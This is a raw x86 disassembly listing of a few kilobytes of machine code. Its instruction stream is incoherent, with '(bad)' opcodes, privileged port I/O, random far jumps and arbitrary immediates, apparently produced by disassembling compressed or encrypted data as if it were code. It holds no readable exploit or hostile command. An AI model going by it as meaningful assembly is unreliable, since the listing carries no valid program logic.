  41edf6:	jp     0x41eda9
  41edf8:	lahf   
  41edf9:	cmp    DWORD PTR [ebx+ebx*4-0x23abe899],edi
  41ee00:	repz cdq 
  41ee02:	xchg   edi,eax
  41ee03:	inc    esp
  41ee04:	es adc bh,cl
  41ee07:	pop    edi
  41ee08:	lods   al,BYTE PTR ds:[esi]
  41ee09:	outs   dx,DWORD PTR ds:[esi]
  41ee0a:	mov    ds:0x46be7b68,al
  41ee0f:	repz sbb dh,al
  41ee12:	ja     0x41ee43
  41ee14:	dec    ebp
  41ee15:	and    eax,0x91dbc4be
  41ee1a:	stos   DWORD PTR es:[edi],eax
  41ee1b:	mov    esi,0x3f0e44d4
  41ee20:	bound  ebp,QWORD PTR [edi]
  41ee22:	add    DWORD PTR [edx-0xf],ecx
  41ee25:	xor    al,0x25
  41ee27:	(bad)
  41ee2b:	sbb    al,0xf1
  41ee2d:	stc    
  41ee2e:	inc    edx
  41ee2f:	sar    DWORD PTR [esi],1
  41ee31:	or     eax,0x6afc05ac
  41ee36:	enter  0x5fd1,0x68
  41ee3a:	fs imul ebp,edi,0xffffffb3
  41ee3e:	jp     0x41ee05
  41ee40:	jmp    0x63b4:0xe6d97705
  41ee47:	iret   
  41ee48:	stos   BYTE PTR es:[edi],al
  41ee49:	out    0x77,eax
  41ee4b:	dec    esi
  41ee4c:	or     BYTE PTR [ebp+0x1c91ca50],cl
  41ee52:	mov    bl,0x7
  41ee55:	imul   edx,DWORD PTR [ebp+0x505b2578],0x7c
  41ee5c:	faddp  st(2),st
  41ee5e:	pop    ss
  41ee5f:	cmp    eax,0x7a7ab78
  41ee64:	inc    ebp
  41ee65:	and    eax,0x6e0c9de6
  41ee6a:	dec    ecx
  41ee6b:	jl     0x41ee60
  41ee6d:	ins    DWORD PTR es:[edi],dx
  41ee6e:	sbb    bl,BYTE PTR [ecx-0x5086407c]
  41ee74:	retf   
  41ee75:	dec    edi
  41ee76:	xor    BYTE PTR [edx],ch
  41ee78:	mov    ah,0xc7
  41ee7a:	dec    eax
  41ee7b:	pushf  
  41ee7c:	hlt    
  41ee7d:	call   DWORD PTR [esi-0x22]
  41ee80:	dec    ecx
  41ee81:	xchg   BYTE PTR [ebp+0x3b],dl
  41ee84:	adc    ebp,DWORD PTR [ecx]
  41ee86:	or     ah,al
  41ee88:	cmp    ecx,edx
  41ee8a:	pop    eax
  41ee8b:	fdivp  st(6),st
  41ee8d:	pop    ebx
  41ee8e:	daa    
  41ee8f:	in     eax,dx
  41ee90:	daa    
  41ee91:	fs fabs 
  41ee94:	mov    bl,0x1b
  41ee96:	xchg   esi,eax
  41ee97:	aas    
  41ee98:	adc    DWORD PTR [ecx-0x63ad519e],esp
  41ee9e:	cmc    
  41ee9f:	xor    ecx,DWORD PTR [edi]
  41eea1:	xor    al,0x0
  41eea3:	arpl   WORD PTR [eax+0x6f],si
  41eea6:	mov    bl,0x9c
  41eea8:	push   ss
  41eea9:	and    esp,DWORD PTR [edx]
  41eeab:	cdq    
  41eeac:	mov    BYTE PTR [eax-0x3e],ah
  41eeaf:	jp     0x41ee97
  41eeb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeb2:	mov    edi,0x1a14aa01
  41eeb7:	xchg   ebp,eax
  41eeb8:	iret   
  41eeb9:	jb     0x41eec3
  41eebb:	xor    BYTE PTR [ecx+0x53],cl
  41eebe:	sbb    esi,DWORD PTR [edx-0x31]
  41eec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eec2:	nop
  41eec3:	pop    eax
  41eec4:	xchg   esi,eax
  41eec5:	les    eax,FWORD PTR [ecx+0xb262598]
  41eecb:	jle    0x41eee9
  41eecd:	mov    ebx,0x4e9c5233
  41eed2:	inc    BYTE PTR [edi]
  41eed4:	clc    
  41eed5:	and    DWORD PTR [ebx*4-0x223b9d81],ebp
  41eedc:	jge    0x41ef4b
  41eede:	adc    DWORD PTR [edx],esp
  41eee0:	mov    gs,WORD PTR [ecx-0x33]
  41eee3:	jmp    DWORD PTR [esi-0x471ca0b2]
  41eee9:	dec    edi
  41eeea:	retf   0x41bc
  41eeed:	shl    DWORD PTR [ebx],cl
  41eeef:	(bad)  
  41eef0:	inc    edi
  41eef1:	mov    eax,0x3d16820d
  41eef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eef7:	xchg   BYTE PTR [edx-0x65],cl
  41eefa:	xchg   DWORD PTR [ecx],ebp
  41eefc:	and    eax,0x585b1f18
  41ef01:	not    BYTE PTR [ecx+0x6436e557]
  41ef07:	mov    bh,0x31
  41ef09:	push   ss
  41ef0a:	sub    ah,BYTE PTR [ebx]
  41ef0c:	fsubr  DWORD PTR ds:[eax]
  41ef0f:	les    ebx,FWORD PTR ds:0xc3993379
  41ef15:	cld    
  41ef16:	dec    eax
  41ef17:	pop    eax
  41ef18:	leave  
  41ef19:	test   DWORD PTR [di],eax
  41ef1c:	rcl    BYTE PTR [eax],1
  41ef1e:	mov    bh,0xf0
  41ef20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef21:	lock in eax,0xc4
  41ef24:	and    edx,DWORD PTR ds:0xc026dadf
  41ef2a:	push   0xffffffe2
  41ef2c:	push   esp
  41ef2d:	cmp    BYTE PTR [esi-0x3c6977fd],ah
  41ef33:	push   edx
  41ef34:	mov    ah,0xa0
  41ef36:	stos   BYTE PTR es:[edi],al
  41ef37:	dec    edi
  41ef38:	xor    ebx,DWORD PTR fs:[edi+0x5a38ad0e]
  41ef3f:	lods   al,BYTE PTR ds:[esi]
  41ef40:	icebp  
  41ef41:	push   ebx
  41ef42:	inc    esi
  41ef43:	int3   
  41ef44:	xchg   edx,eax
  41ef45:	(bad)  
  41ef47:	shl    DWORD PTR ds:0x6feb15d5,cl
  41ef4d:	xor    DWORD PTR [ecx],ebx
  41ef4f:	jle    0x41ef8d
  41ef51:	jno    0x41efaa
  41ef53:	fidiv  WORD PTR [edi]
  41ef55:	sbb    DWORD PTR [esi+ecx*4+0x4f],esi
  41ef59:	fwait
  41ef5a:	push   cs
  41ef5b:	punpckhdq mm0,QWORD PTR [eax]
  41ef5e:	sub    dl,BYTE PTR [ebx]
  41ef60:	das    
  41ef61:	cs out dx,eax
  41ef63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef64:	scas   eax,DWORD PTR es:[edi]
  41ef65:	shl    ch,cl
  41ef67:	imul   ebx,DWORD PTR [ebp+0x7f62cc25],0x5
  41ef6e:	iret   
  41ef6f:	inc    ebx
  41ef70:	jae    0x41ef17
  41ef72:	mov    bh,0x8a
  41ef74:	sbb    BYTE PTR [edi+0x370d4ae7],bh
  41ef7a:	popf   
  41ef7b:	and    eax,0x77f5712
  41ef80:	adc    eax,DWORD PTR [edi+eiz*8]
  41ef83:	cmp    edi,0xfa5418f4
  41ef89:	scas   eax,DWORD PTR es:[edi]
  41ef8a:	and    BYTE PTR [ebx],bl
  41ef8c:	ja     0x41ef8f
  41ef8e:	and    al,0x4
  41ef90:	jne    0x41ef6f
  41ef92:	in     al,0x8a
  41ef94:	cli    
  41ef95:	test   BYTE PTR [eax+0x4d],dh
  41ef98:	out    0x26,eax
  41ef9a:	dec    edx
  41ef9b:	iret   
  41ef9c:	sub    DWORD PTR [edx-0x3ef402fd],ebx
  41efa2:	add    al,BYTE PTR [edi+esi*4-0x62c9e2e5]
  41efa9:	mov    ah,0x79
  41efab:	test   ebx,edi
  41efad:	lea    esp,[ebp+0x74]
  41efb0:	jnp    0x41efbe
  41efb2:	push   ebx
  41efb3:	dec    ebp
  41efb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efb5:	or     DWORD PTR ds:0x2e2f7f8d,edi
  41efbb:	inc    esp
  41efbc:	push   ds
  41efbd:	cmp    al,0xc3
  41efbf:	inc    ebx
  41efc0:	pop    es
  41efc1:	mov    ecx,0x23f631ef
  41efc6:	mov    edx,0xf8974869
  41efcb:	(bad)  
  41efcc:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41efce:	adc    bl,BYTE PTR [edi]
  41efd0:	lahf   
  41efd1:	jp     0x41eff2
  41efd3:	xchg   edi,eax
  41efd4:	or     DWORD PTR gs:[edi+0x62],eax
  41efd8:	loope  0x41f03b
  41efda:	sbb    cl,bl
  41efdc:	push   esi
  41efdd:	push   cs
  41efde:	add    BYTE PTR [ecx+0x4cac4298],0x74
  41efe5:	mov    DWORD PTR [ebx],eax
  41efe7:	xor    BYTE PTR [ebx-0x343232],dh
  41efed:	adc    BYTE PTR [ebp-0x3e],ah
  41eff0:	lods   al,BYTE PTR ds:[esi]
  41eff1:	and    eax,edi
  41eff3:	inc    ebx
  41eff4:	mov    esi,0x3a9f06f9
  41eff9:	inc    esi
  41effa:	inc    edx
  41effb:	xor    ah,BYTE PTR [eax+0x28]
  41effe:	rol    DWORD PTR [ebx],1
  41f000:	and    bh,BYTE PTR [eax-0x9]
  41f003:	aas    
  41f004:	sar    al,1
  41f006:	aaa    
  41f007:	inc    ebp
  41f008:	fadd   DWORD PTR [edi+0x23]
  41f00b:	xchg   ecx,eax
  41f00c:	mov    fs,WORD PTR [edi-0x10bf47a9]
  41f012:	push   ebp
  41f013:	adc    esi,0x55
  41f016:	and    al,BYTE PTR [esi+0x1aebf586]
  41f01c:	or     eax,0x5dd66df0
  41f021:	in     eax,0xe0
  41f023:	rcr    BYTE PTR [edx+0x79],cl
  41f026:	push   0x44ec25a
  41f02b:	adc    ch,dh
  41f02d:	mov    ds:0xb3522a47,eax
  41f032:	pusha  
  41f033:	cmp    DWORD PTR [ecx],ebx
  41f035:	cdq    
  41f036:	enter  0xc5e3,0x9
  41f03a:	call   0x6e1a6d62
  41f03f:	stc    
  41f040:	fyl2xp1 
  41f042:	std    
  41f043:	and    bh,BYTE PTR [ebx+0xe738d79]
  41f049:	xchg   esi,eax
  41f04a:	pushf  
  41f04b:	cs push esi
  41f04d:	loop   0x41efec
  41f04f:	xor    DWORD PTR [esi],ebp
  41f051:	xlat   BYTE PTR ds:[ebx]
  41f052:	pop    ss
  41f053:	inc    ecx
  41f054:	pop    edx
  41f055:	daa    
  41f056:	fsubr  QWORD PTR [ebp-0x44]
  41f059:	daa    
  41f05a:	(bad)  
  41f05b:	xor    eax,eax
  41f05d:	popa   
  41f05e:	neg    cl
  41f060:	lods   al,BYTE PTR gs:[esi]
  41f062:	ror    BYTE PTR [ebx+0x12],1
  41f065:	jmp    0x41f0d1
  41f067:	ret    
  41f068:	rcl    bl,0x72
  41f06b:	pop    ecx
  41f06c:	loop   0x41f077
  41f06e:	into   
  41f06f:	and    dh,BYTE PTR [edi]
  41f071:	jnp    0x41f0a0
  41f073:	mov    dh,0xf3
  41f075:	add    eax,DWORD PTR [ecx+0x651364f4]
  41f07b:	mov    eax,0xacc53b44
  41f080:	mov    ecx,0xc8756b8b
  41f085:	sub    DWORD PTR [esi],esp
  41f087:	js     0x41f059
  41f089:	cmp    edx,DWORD PTR [ebx+edx*2]
  41f08c:	shl    bh,0x48
  41f08f:	xchg   DWORD PTR [eax],edx
  41f091:	mov    DWORD PTR [edi-0x25048e0d],ebp
  41f097:	scas   al,BYTE PTR es:[edi]
  41f098:	pop    edi
  41f099:	mov    esp,0xc3afcd86
  41f09e:	scas   eax,DWORD PTR es:[edi]
  41f09f:	repnz push esp
  41f0a1:	fld    DWORD PTR [ebp+0x116c6a31]
  41f0a7:	pop    ebp
  41f0a8:	fidiv  DWORD PTR [ebp-0x2f]
  41f0ab:	mov    ah,0xa9
  41f0ad:	popf   
  41f0ae:	push   0xca975a85
  41f0b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0b4:	cmp    eax,0xeafc5abe
  41f0b9:	in     eax,dx
  41f0ba:	bound  esi,QWORD PTR [edi]
  41f0bc:	or     cl,cl
  41f0be:	sbb    bh,BYTE PTR [edx+0xb]
  41f0c1:	popa   
  41f0c2:	xchg   edi,eax
  41f0c3:	popf   
  41f0c4:	push   es
  41f0c5:	xor    DWORD PTR [ebp-0x23],edx
  41f0c8:	or     ch,BYTE PTR [ecx+0x558ac063]
  41f0ce:	mov    WORD PTR [ebx+0x3a],?
  41f0d1:	in     eax,0xeb
  41f0d3:	inc    ebx
  41f0d4:	mov    ebx,DWORD PTR [esi+ecx*8]
  41f0d7:	ror    BYTE PTR [ebp+0x7b8ce3c7],cl
  41f0dd:	call   0x6a9b5085
  41f0e2:	aaa    
  41f0e3:	jne    0x41f099
  41f0e5:	push   ds
  41f0e6:	and    edx,DWORD PTR [eax+0x25]
  41f0e9:	int3   
  41f0ea:	cmp    al,0x4b
  41f0ec:	pop    ss
  41f0ed:	stos   BYTE PTR es:[edi],al
  41f0ee:	pusha  
  41f0ef:	fiadd  WORD PTR [edx+edi*8]
  41f0f2:	adc    BYTE PTR [eax],bl
  41f0f4:	test   ecx,ecx
  41f0f6:	pop    ecx
  41f0f7:	pop    DWORD PTR ds:0x41d3e3a2
  41f0fd:	push   ss
  41f0fe:	loopne 0x41f0d2
  41f100:	std    
  41f101:	xor    bl,BYTE PTR [ecx-0x65c9f683]
  41f107:	add    al,0x16
  41f109:	xchg   BYTE PTR [ebp+0x6c44b4f2],al
  41f10f:	and    eax,DWORD PTR [ecx-0x35]
  41f112:	ror    DWORD PTR [ebx+0x5f],0xb9
  41f116:	mov    esi,0x31530146
  41f11b:	loop   0x41f0d3
  41f11d:	mov    bl,0x67
  41f11f:	leave  
  41f120:	addr16 sbb al,0x2a
  41f123:	dec    ebp
  41f124:	push   esi
  41f125:	inc    ebp
  41f126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f127:	gs sub edx,edi
  41f12a:	aaa    
  41f12b:	fist   WORD PTR [edi-0x2b4eb3fa]
  41f131:	cmp    eax,0x17fa6efe
  41f136:	cmc    
  41f137:	lods   eax,DWORD PTR ds:[esi]
  41f138:	je     0x41f14d
  41f13a:	test   BYTE PTR [ebx+0x15],ch
  41f13d:	rol    dl,0x50
  41f140:	fnstsw WORD PTR [edi-0x1a1e5d13]
  41f146:	stos   DWORD PTR es:[edi],eax
  41f147:	call   0xb28c:0x30aedf79
  41f14e:	push   0xa41e9e59
  41f153:	in     eax,0xdd
  41f155:	fs xor al,0x7c
  41f158:	cmc    
  41f159:	inc    ebp
  41f15a:	jmp    0x278b:0x8361dfc1
  41f161:	gs fs ret 0xee68
  41f166:	cmp    dh,ch
  41f168:	bound  eax,QWORD PTR [esi+0x53c3c38c]
  41f16e:	mov    ecx,0x4712dbc8
  41f173:	lock mov edx,0xdb22ef20
  41f179:	mov    ds:0xd6fe8abd,al
  41f17e:	mov    edx,0xa36ccdaa
  41f183:	inc    esi
  41f184:	ror    DWORD PTR [ebp+0x24ffa4a],0x7d
  41f18b:	shl    DWORD PTR [eax],0xa1
  41f18e:	xor    al,dh
  41f190:	or     eax,0xa9906920
  41f195:	repz xchg ebx,eax
  41f197:	or     al,0xc
  41f199:	(bad)  
  41f19a:	cli    
  41f19b:	push   ebx
  41f19c:	bnd call 0xd99f4070
  41f1a2:	mov    ecx,0x157495b5
  41f1a7:	mov    ds:0x6db54b49,al
  41f1ac:	mov    ebx,0x65244222
  41f1b1:	std    
  41f1b2:	or     dh,bh
  41f1b4:	(bad)  
  41f1b5:	xor    eax,0x58ce825b
  41f1ba:	cmp    BYTE PTR [edx+0x19],ah
  41f1bd:	mov    eax,0x9737d539
  41f1c2:	in     al,dx
  41f1c3:	retf   0x2d0
  41f1c6:	sub    DWORD PTR ds:0x33d132d7,0x18
  41f1cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1ce:	outs   dx,DWORD PTR ds:[esi]
  41f1cf:	int3   
  41f1d0:	inc    esp
  41f1d1:	icebp  
  41f1d2:	mov    esi,0xf0e0ac72
  41f1d7:	inc    eax
  41f1d8:	sbb    DWORD PTR [ebp+eiz*2+0x6a],esi
  41f1dc:	mov    bh,dl
  41f1de:	add    eax,0x63f1048c
  41f1e3:	cwde   
  41f1e4:	aaa    
  41f1e5:	xor    eax,0xedb644c9
  41f1ea:	scas   al,BYTE PTR es:[edi]
  41f1eb:	cs xor dh,dh
  41f1ee:	jbe    0x41f17b
  41f1f0:	pop    ss
  41f1f1:	call   0x2f97:0xd9e2fabe
  41f1f8:	jge    0x41f19e
  41f1fa:	mul    BYTE PTR [esi-0x60692f28]
  41f200:	lahf   
  41f201:	shl    BYTE PTR [ebx-0x2781272a],cl
  41f207:	cmp    bl,BYTE PTR [ecx+0x75]
  41f20a:	xchg   esp,eax
  41f20b:	adc    BYTE PTR [ebx-0x45],0xdc
  41f20f:	and    esp,DWORD PTR [ecx+0x40]
  41f212:	retf   
  41f213:	xchg   edx,eax
  41f214:	sbb    al,0x8d
  41f216:	xchg   DWORD PTR [ebp-0xd6040b7],ecx
  41f21c:	(bad)  
  41f21e:	pop    ebp
  41f21f:	cld    
  41f220:	int    0xbf
  41f222:	pop    ebx
  41f223:	push   ecx
  41f224:	add    al,0xa1
  41f226:	test   al,0xe
  41f228:	retf   
  41f229:	out    dx,al
  41f22a:	xor    ebx,DWORD PTR [esi-0x1b]
  41f22d:	in     eax,0x4a
  41f22f:	repz leave 
  41f231:	(bad)  
  41f232:	sbb    ebx,DWORD PTR [edx-0x42]
  41f235:	(bad)  
  41f236:	in     eax,0x8
  41f238:	ins    DWORD PTR es:[edi],dx
  41f239:	popf   
  41f23a:	jns    0x41f2b1
  41f23c:	sbb    eax,0x2c291dad
  41f241:	pop    eax
  41f242:	inc    ebx
  41f243:	ss mov cl,0x1c
  41f246:	adc    BYTE PTR [esi+0x6cf0c23b],dh
  41f24c:	inc    ebx
  41f24d:	icebp  
  41f24e:	push   es
  41f24f:	fidivr DWORD PTR [edx]
  41f251:	popf   
  41f252:	and    ch,BYTE PTR [edi]
  41f254:	mov    edx,0x3248bc58
  41f259:	ins    DWORD PTR es:[edi],dx
  41f25a:	jle    0x41f254
  41f25c:	fbld   TBYTE PTR [esi+eax*1-0x47]
  41f260:	dec    esp
  41f261:	popa   
  41f262:	adc    BYTE PTR ds:0x866d25e,ch
  41f268:	cmp    al,0x30
  41f26a:	in     eax,0xbb
  41f26c:	call   0xe88f:0xe71fa985
  41f273:	sbb    eax,0x49a5178c
  41f278:	mov    ecx,0x9a9037f4
  41f27d:	pop    eax
  41f27e:	mov    dl,0x2c
  41f280:	ds gs and al,0x36
  41f284:	sub    cl,BYTE PTR [eax]
  41f286:	pop    ecx
  41f287:	mov    ch,0x2a
  41f289:	push   ecx
  41f28a:	lock scas al,BYTE PTR es:[edi]
  41f28c:	lods   eax,DWORD PTR ds:[esi]
  41f28d:	cmp    ebx,DWORD PTR [esp+edx*8-0x33]
  41f291:	ds loop 0x41f2d4
  41f294:	mov    eax,ds:0xf43fce7d
  41f299:	and    esi,DWORD PTR [edx+0x68]
  41f29c:	loopne 0x41f289
  41f29e:	sub    eax,0x4d07b36e
  41f2a3:	dec    eax
  41f2a4:	xchg   esp,eax
  41f2a5:	ret    0x905d
  41f2a8:	push   ds
  41f2a9:	sbb    esp,ebx
  41f2ab:	xchg   edx,eax
  41f2ac:	jl     0x41f298
  41f2ae:	aam    0xa5
  41f2b0:	jne    0x41f2b5
  41f2b2:	and    ebx,DWORD PTR [eax-0x65]
  41f2b5:	xchg   esp,eax
  41f2b6:	shl    DWORD PTR [edx+0x33],0x99
  41f2ba:	fistp  QWORD PTR [esi+0x58481ae3]
  41f2c0:	ins    BYTE PTR es:[edi],dx
  41f2c1:	fwait
  41f2c2:	sbb    cl,BYTE PTR [esi]
  41f2c4:	daa    
  41f2c5:	inc    ecx
  41f2c6:	pop    edi
  41f2c7:	mov    ebx,0x211a1e47
  41f2cc:	and    DWORD PTR [ebx+eiz*2-0x78],0x42
  41f2d1:	add    eax,0x399ee0ad
  41f2d6:	cmp    ah,dh
  41f2d8:	push   esi
  41f2d9:	fstp   TBYTE PTR [ebp-0x1d646b43]
  41f2df:	mov    ah,0xc4
  41f2e1:	dec    ebx
  41f2e2:	xchg   edx,eax
  41f2e3:	les    ebx,FWORD PTR [edi+0x5c010e9]
  41f2e9:	in     eax,0x2e
  41f2eb:	enter  0x7bf6,0x87
  41f2ef:	imul   esp,ebx,0xaf94cac9
  41f2f5:	gs jnp 0x41f304
  41f2f8:	inc    edx
  41f2f9:	in     eax,0x25
  41f2fb:	sbb    eax,0xd13f675e
  41f300:	mov    bh,cl
  41f302:	sbb    eax,DWORD PTR [edx+0x6c]
  41f305:	lea    eax,[edi]
  41f307:	dec    ecx
  41f308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f309:	sbb    eax,0xc39189ce
  41f30e:	test   esi,ecx
  41f310:	pop    ecx
  41f311:	push   ds
  41f312:	xor    cl,BYTE PTR ds:[edi]
  41f315:	outs   dx,BYTE PTR ds:[esi]
  41f316:	neg    BYTE PTR [eax+0x2d]
  41f319:	mov    bh,0x92
  41f31b:	mov    eax,ds:0x5732e476
  41f320:	add    al,0x42
  41f322:	and    BYTE PTR [esi+0x5e],0xb9
  41f326:	dec    eax
  41f327:	imul   edi,DWORD PTR [edi+0x42642a5],0x57df317d
  41f331:	cwde   
  41f332:	pushf  
  41f333:	lods   eax,DWORD PTR ds:[esi]
  41f334:	mov    ds:0x18620854,eax
  41f339:	retf   
  41f33a:	xor    ebp,edx
  41f33c:	and    BYTE PTR [edx-0x14],bh
  41f33f:	aaa    
  41f340:	mov    ebx,0x24c35fd0
  41f345:	mov    edi,0x1ac5c6f6
  41f34a:	or     BYTE PTR [esi],cl
  41f34c:	cmp    ebp,ebx
  41f34e:	fistp  DWORD PTR [edx]
  41f350:	cmc    
  41f351:	cdq    
  41f352:	sbb    BYTE PTR [edi+edx*2],dh
  41f355:	mov    eax,ds:0x16697e93
  41f35a:	inc    ebp
  41f35b:	imul   esp,DWORD PTR [ecx],0x69
  41f35e:	mov    WORD PTR [ecx+edx*8+0xb15ec86],fs
  41f365:	mov    ebx,0xb329f5df
  41f36a:	xor    al,0x84
  41f36c:	clc    
  41f36d:	push   ecx
  41f36e:	retf   0x85f8
  41f371:	or     esp,DWORD PTR [ebx-0x7ecf9848]
  41f377:	adc    al,0x55
  41f379:	outs   dx,BYTE PTR ds:[esi]
  41f37a:	xchg   ebx,eax
  41f37b:	add    al,0x29
  41f37d:	rcr    DWORD PTR [ecx],1
  41f37f:	sub    BYTE PTR [ecx+0x15dd6b66],dh
  41f385:	pop    ss
  41f386:	pusha  
  41f387:	lahf   
  41f388:	and    ebp,ebx
  41f38a:	inc    edx
  41f38b:	jl     0x41f32b
  41f38d:	cmp    bl,BYTE PTR [ebp+0x0]
  41f390:	adc    eax,0x4faff32a
  41f395:	sub    BYTE PTR [esi+0x57c656dd],0x7f
  41f39c:	mov    edx,0xe801eb16
  41f3a1:	(bad)  
  41f3a2:	xor    BYTE PTR [esi-0x65],al
  41f3a5:	inc    edi
  41f3a6:	outs   dx,DWORD PTR ds:[esi]
  41f3a7:	xchg   ebx,eax
  41f3a8:	jnp    0x41f373
  41f3aa:	mov    edi,0x434dea99
  41f3af:	(bad)  
  41f3b0:	jg     0x41f38a
  41f3b2:	scas   al,BYTE PTR es:[edi]
  41f3b3:	push   esp
  41f3b4:	xchg   dh,bh
  41f3b6:	push   esi
  41f3b7:	inc    ecx
  41f3b8:	nop
  41f3b9:	adc    ebx,DWORD PTR [edx+0x59ddd19e]
  41f3bf:	repnz xchg esi,eax
  41f3c1:	(bad)  
  41f3c2:	xor    DWORD PTR [ebx-0x3c],eax
  41f3c5:	icebp  
  41f3c6:	rol    BYTE PTR [edx],1
  41f3c8:	mov    al,ds:0x4bd5eed1
  41f3cd:	pop    esp
  41f3ce:	xlat   BYTE PTR ds:[ebx]
  41f3cf:	cdq    
  41f3d0:	jp     0x41f37e
  41f3d2:	sti    
  41f3d3:	mov    esp,0x8eaf1d0a
  41f3d8:	mov    edi,0x25b3574a
  41f3dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3de:	fsubr  QWORD PTR [ecx-0x31ab8489]
  41f3e4:	push   esi
  41f3e5:	(bad)  
  41f3e6:	rcr    DWORD PTR [edi],1
  41f3e8:	cmp    cl,BYTE PTR [edi-0x4f2ae020]
  41f3ee:	retf   
  41f3ef:	sub    esp,DWORD PTR [ebp-0x76]
  41f3f2:	xor    BYTE PTR [ebp+0x3],0xd1
  41f3f6:	adc    edi,DWORD PTR [ebp+edx*1+0x510a403a]
  41f3fd:	sbb    DWORD PTR [edi-0xb],esp
  41f400:	jo     0x41f44b
  41f402:	inc    eax
  41f403:	pop    ds
  41f404:	xchg   esp,eax
  41f405:	rol    BYTE PTR [ebp-0x19def280],1
  41f40b:	fild   QWORD PTR [ebp-0x74]
  41f40e:	in     eax,0x95
  41f410:	mov    gs,WORD PTR [edi+edx*8+0x6853eee5]
  41f417:	enter  0x2db9,0x7d
  41f41b:	adc    DWORD PTR [eax],ebp
  41f41d:	fadd   DWORD PTR [esi+0x6f0393d6]
  41f423:	push   cs
  41f424:	loopne 0x41f3d3
  41f426:	call   0xa01f911b
  41f42b:	inc    edi
  41f42c:	push   ebp
  41f42d:	gs inc ebx
  41f42f:	xor    edi,DWORD PTR [edi-0xa]
  41f432:	xchg   ebx,eax
  41f433:	cmp    ch,ah
  41f435:	fnsave [eax-0x297404f2]
  41f43b:	sbb    BYTE PTR [edx],bl
  41f43d:	push   ecx
  41f43e:	pop    edi
  41f43f:	test   DWORD PTR [edx-0x6a],edx
  41f442:	mov    ds:0x280b0ac1,al
  41f447:	sub    bh,cl
  41f449:	mov    al,ds:0xabb55dc8
  41f44e:	xchg   DWORD PTR [edi-0x39],ebp
  41f451:	adc    al,0x1b
  41f453:	and    DWORD PTR [eax+0x46962e1f],esp
  41f459:	dec    esp
  41f45a:	dec    ebp
  41f45b:	push   esp
  41f45c:	jo     0x41f45a
  41f45e:	sti    
  41f45f:	xchg   ecx,eax
  41f460:	pop    edx
  41f461:	stos   BYTE PTR es:[edi],al
  41f462:	push   cs
  41f463:	scas   al,BYTE PTR es:[edi]
  41f464:	cmp    cl,BYTE PTR [eax-0xab6ca8a]
  41f46a:	es add ebp,eax
  41f46d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f46e:	mov    ebp,0xa70d2d06
  41f473:	adc    eax,0xb052ea42
  41f478:	pusha  
  41f479:	dec    esp
  41f47a:	cmp    ebp,DWORD PTR [ebx]
  41f47c:	xchg   ecx,eax
  41f47d:	in     eax,0xe
  41f47f:	dec    edx
  41f480:	in     al,0x29
  41f482:	retf   
  41f483:	les    ebx,FWORD PTR [ecx+ecx*4+0x5cbd64ea]
  41f48a:	xchg   ecx,eax
  41f48b:	repz add DWORD PTR [ecx+0x60f7f7c1],0xffffffe0
  41f493:	(bad)  
  41f494:	mov    edi,0x5ef5d5a6
  41f499:	pop    esi
  41f49a:	loope  0x41f50b
  41f49c:	jecxz  0x41f45f
  41f49e:	les    eax,FWORD PTR [edx+eax*1]
  41f4a1:	mov    bl,0x9d
  41f4a3:	clc    
  41f4a4:	fmul   QWORD PTR [esi]
  41f4a6:	icebp  
  41f4a7:	mov    ss,WORD PTR [edx-0x5e]
  41f4aa:	adc    ebp,0xffffff80
  41f4ad:	rcr    ch,1
  41f4af:	jb     0x41f4e2
  41f4b1:	push   esp
  41f4b2:	mov    al,ds:0x7b8ba9a
  41f4b7:	sub    DWORD PTR [ecx],0xffffffad
  41f4ba:	scas   eax,DWORD PTR es:[edi]
  41f4bb:	xchg   edi,eax
  41f4bc:	mov    DWORD PTR [edx-0x68],ecx
  41f4bf:	mov    WORD PTR [edx+0x2fad9749],es
  41f4c5:	and    eax,0xb0cfcd3a
  41f4ca:	in     eax,dx
  41f4cb:	sahf   
  41f4cc:	or     al,0xd
  41f4ce:	add    BYTE PTR [esi+0x757ae8f0],0x28
  41f4d5:	aas    
  41f4d6:	jg     0x41f4c2
  41f4d8:	sbb    eax,0xb5e935c
  41f4dd:	cmc    
  41f4de:	into   
  41f4df:	push   edi
  41f4e0:	add    esi,DWORD PTR [edi+0x2b]
  41f4e3:	push   eax
  41f4e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4e5:	rep ins BYTE PTR es:[edi],dx
  41f4e7:	xlat   BYTE PTR ds:[ebx]
  41f4e8:	popf   
  41f4e9:	cld    
  41f4ea:	test   al,0x41
  41f4ec:	not    al
  41f4ee:	jmp    0xb72cb24e
  41f4f3:	out    0xbd,al
  41f4f5:	xchg   esp,eax
  41f4f6:	stc    
  41f4f7:	jg     0x41f4ff
  41f4f9:	lods   eax,DWORD PTR ds:[esi]
  41f4fa:	shr    BYTE PTR [ebp+0x755ee051],cl
  41f500:	les    ebp,FWORD PTR [esi+0x10841ab0]
  41f506:	retf   0xe312
  41f509:	loop   0x41f51c
  41f50b:	popf   
  41f50c:	adc    ebp,DWORD PTR [eax-0x78]
  41f50f:	cmp    DWORD PTR [esp+ecx*4-0x4b],eax
  41f513:	div    esp
  41f515:	xor    eax,DWORD PTR [edx+0x769abc84]
  41f51b:	or     edi,edi
  41f51d:	jl     0x41f4b1
  41f51f:	nop
  41f520:	jns    0x41f4f4
  41f522:	fmul   DWORD PTR [ebx-0x20]
  41f525:	mov    edx,0x1d375700
  41f52a:	and    cl,BYTE PTR [esi-0x39abded0]
  41f530:	add    al,BYTE PTR [ebx+eiz*2-0x56]
  41f534:	xor    esi,DWORD PTR [edx+0x16]
  41f537:	mov    dl,0xfa
  41f539:	fnstsw WORD PTR [ebp+0x49]
  41f53c:	fdivr  QWORD PTR [edx+0x9]
  41f53f:	dec    ebx
  41f540:	ins    BYTE PTR es:[edi],dx
  41f541:	push   0xbf96922d
